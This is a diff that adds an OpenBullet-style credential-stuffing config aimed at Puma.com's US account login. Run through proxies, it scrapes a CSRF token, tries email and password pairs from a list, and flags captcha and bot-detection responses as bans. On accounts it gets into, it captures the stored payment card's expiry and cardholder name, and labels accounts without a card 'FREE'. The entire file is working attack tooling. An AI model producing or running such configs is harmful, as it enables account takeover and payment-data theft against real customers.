@@ -1,0 +1,104 @@
+[SETTINGS]
+{
+  "Name": "Puma.com",
+  "SuggestedBots": 150,
+  "MaxCPM": 0,
+  "LastModified": "2021-02-10T09:22:05.9222319+05:30",
+  "AdditionalInfo": "Ricking#3224",
+  "Author": "Ricking#3224",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 4,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://us.puma.com/en/us/account/login" 
+  
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.146 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "name=\"csrf_token\" value=\"" "\"" -> VAR "1" 
+
+REQUEST POST "https://us.puma.com/on/demandware.store/Sites-NA-Site/en_US/Account-Login?rurl=1" 
+  CONTENT "loginEmail=<USER>&loginPassword=<PASS>&csrf_token=<1>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER ": scheme: https" 
+  HEADER "accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "content-length: 245" 
+  HEADER "content-type: application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "origin: https://us.puma.com" 
+  HEADER "referer: https://us.puma.com/en/us/account/login" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.146 Safari/537.36" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+
+KEYCHECK 
+  KEYCHAIN Ban OR 
+    KEY "Please verify you are a human" 
+    KEY "\"action\": \"PX-ABR\"," 
+  KEYCHAIN Failure OR 
+    KEY "action\": \"Account-Login\"," 
+  KEYCHAIN Success OR 
+    KEY "success\": true," 
+
+REQUEST GET "https://us.puma.com/en/us/account" 
+  
+  HEADER "Accept: */*" 
+  HEADER "referer: https://us.puma.com/en/us/account/login?action=register" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "card-body card-info-group row" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<SOURCE>" DoesNotContain "card-body card-info-group row" 
+
+PARSE "<SOURCE>" LR "<p>Ending" "</p>" CreateEmpty=FALSE -> CAP "CC EXPIRY " 
+
+PARSE "<SOURCE>" LR "<div class=\"card-body card-info-group row\">" "<p>************" -> VAR "0" 
+
+PARSE "<0>" LR "<p>" "</p>" CreateEmpty=FALSE -> CAP "CARD NAME " 
+
